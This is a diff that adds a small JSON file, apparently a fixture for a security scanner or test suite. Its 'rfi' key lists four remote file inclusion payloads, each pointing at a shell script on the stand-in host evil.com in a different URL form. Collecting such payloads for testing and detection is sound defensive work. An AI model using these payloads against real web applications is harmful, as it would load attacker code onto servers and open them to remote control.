@@ -1,0 +1,8 @@
+{
+  "rfi": [
+    "http://evil.com/shell.txt",
+    "http://evil.com/shell.txt?",
+    "//evil.com/shell.txt",
+    "ftp://evil.com/shell.txt"
+  ]
+}
